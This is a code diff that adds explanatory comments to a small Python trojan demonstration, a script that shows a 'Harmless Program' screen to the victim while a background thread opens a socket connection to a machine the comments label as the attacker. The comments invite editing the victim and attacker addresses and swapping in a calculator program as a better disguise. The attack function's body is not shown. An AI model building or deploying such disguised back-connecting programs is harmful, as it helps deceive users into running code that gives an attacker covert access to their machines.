@@ -1,3 +1,6 @@
+# This program runs a normal looking program in front and tries to connect to attacker at back. 
+# Therefore the "harmless" and "secret" parts.
+
 import threading
 from multiprocessing import Process
 import time
@@ -5,7 +8,11 @@ import string
 import socket 
 import random 
 
-SRC_IP = "192.168.1.5"
+# Edit these values
+# SRC = victim
+# TARGET = attacker, yeah I interchanged them somehow my bad
+
+SRC_IP = "192.168.1.5" 
 SRC_PORT = 7777
 TARGET_IP = "192.168.1.7"
 TARGET_PORT = 4000 
@@ -23,8 +30,9 @@ class multithread(threading.Thread):
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
             s.connect((TARGET_IP, TARGET_PORT))
         except:
-            print("Exception occured, timeout...")
-    
+            print("Exception occured, timeout...") # This message is not needed, this is displayed on screen of victim just for demonstration.
+            
+# You can use something like calculator program here or something even better
 def normal():
     print("\n")
     print("#"*12+" Welcome to Harmless Program "+"#"*12)
@@ -35,7 +43,7 @@ def normal():
         print("Do you know what is "+ran+"????")
         print("Sleeping for 3 seconds am tired...")
         time.sleep(3)     
-        
+
 def attack():
     count = 0
     while 1:
